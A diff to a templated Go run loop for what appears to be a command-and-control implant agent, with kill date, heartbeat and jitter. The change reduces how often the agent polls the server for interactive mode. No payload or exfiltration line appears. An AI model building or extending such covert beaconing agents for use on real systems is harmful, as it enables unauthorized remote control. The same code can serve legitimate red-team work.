@@ -19,6 +19,8 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 	}
 
 	a.{AGENT_RUNNING_FIELD} = true
+	interactiveCheckCount := 0
+	regularCheckCount := 0
 
 	for a.{AGENT_RUNNING_FIELD} {
 		// Check kill date on each iteration
@@ -32,18 +34,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 			// Sleep for 5 minutes and check again
 			time.Sleep(5 * time.Minute)
 			continue
-		}
-
-		// Check interactive status to determine which endpoint to use
-		shouldBeInteractive, statusErr := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
-		if statusErr == nil {
-			if shouldBeInteractive && !a.{AGENT_INTERACTIVE_MODE_FIELD} {
-				// Switching to interactive mode
-				a.{AGENT_INTERACTIVE_MODE_FIELD} = true
-			} else if !shouldBeInteractive && a.{AGENT_INTERACTIVE_MODE_FIELD} {
-				// Switching from interactive mode to regular mode
-				a.{AGENT_INTERACTIVE_MODE_FIELD} = false
-			}
 		}
 
 		// Use different endpoints based on interactive mode
@@ -74,6 +64,17 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 				}
 			}
 
+			// Check interactive status every 10 iterations in interactive mode
+			interactiveCheckCount++
+			if interactiveCheckCount >= 10 {
+				shouldBeInteractive, statusErr := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
+				if statusErr == nil && !shouldBeInteractive {
+					// Server indicates we should exit interactive mode
+					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
+				}
+				interactiveCheckCount = 0 // Reset counter
+			}
+
 			// Short sleep for quick response in interactive mode
 			time.Sleep(2 * time.Second)
 		} else {
@@ -99,6 +100,19 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 				} else {
 					a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful result submission
 				}
+			}
+
+			// Check interactive status every 3 iterations in regular mode
+			regularCheckCount++
+			if regularCheckCount >= 3 {
+				shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
+				if err == nil {
+					// Update interactive mode based on server status
+					if shouldBeInteractive {
+						a.{AGENT_INTERACTIVE_MODE_FIELD} = true
+					}
+				}
+				regularCheckCount = 0 // Reset counter
 			}
 
 			// In regular mode, use profile-defined heartbeat and jitter
